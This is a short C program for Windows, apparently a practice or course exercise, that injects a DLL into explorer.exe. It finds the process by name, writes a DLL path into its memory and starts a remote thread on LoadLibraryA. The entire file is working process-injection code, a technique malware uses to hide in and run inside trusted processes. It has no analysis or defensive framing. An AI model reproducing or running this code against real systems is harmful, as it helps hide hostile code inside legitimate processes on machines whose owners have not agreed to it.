
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>


int SearchForProcess(const char *processName) {

        HANDLE hSnapshotOfProcesses;
        PROCESSENTRY32 processStruct;
        int pid = 0;
                
        hSnapshotOfProcesses = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hSnapshotOfProcesses) return 0;
                
        processStruct.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(hSnapshotOfProcesses, &processStruct)) {
                CloseHandle(hSnapshotOfProcesses);
                return 0;
        }
                
        while (Process32Next(hSnapshotOfProcesses, &processStruct)) {
                if (lstrcmpiA(processName, processStruct.szExeFile) == 0) {
                        pid = processStruct.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hSnapshotOfProcesses);
                
        return pid;
}


int main(int argc, char *argv[]) {
	
	HANDLE hProcess;
	PVOID pRemoteProcAllocMem;
	PTHREAD_START_ROUTINE pLoadLibrary = NULL;
	char pathToDLL[]="C:\\Users\\Red\\Desktop\\project\\22-DLL_injection\\mspaintDLL";
	//char pathToDLL[]="C:\\mspaintDLL.dll";
	char processToInject[] = "explorer.exe";
	int pid = 0;
	
	
	pid = SearchForProcess(processToInject);
	if ( pid == 0) {
		printf("Process To Inject NOT FOUND! Exiting.\n");
		return -1;
	}

	printf("Process To Inject PID: [ %d ]\nInjecting...", pid);

	pLoadLibrary = (PTHREAD_START_ROUTINE) GetProcAddress( GetModuleHandle("Kernel32.dll"), "LoadLibraryA");

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)(pid));

	if (hProcess != NULL) {
		pRemoteProcAllocMem = VirtualAllocEx(hProcess, NULL, sizeof(pathToDLL), MEM_COMMIT, PAGE_READWRITE);	
	
		WriteProcessMemory(hProcess, pRemoteProcAllocMem, (LPVOID) pathToDLL, sizeof(pathToDLL), NULL);

		CreateRemoteThread(hProcess, NULL, 0, pLoadLibrary, pRemoteProcAllocMem, 0, NULL);
		printf("done!\nallocated Memory addr = %p\n", pRemoteProcAllocMem);

		CloseHandle(hProcess); 
	}
	else {
		printf("OpenProcess failed! Exiting.\n");
		return -2;
	}
}
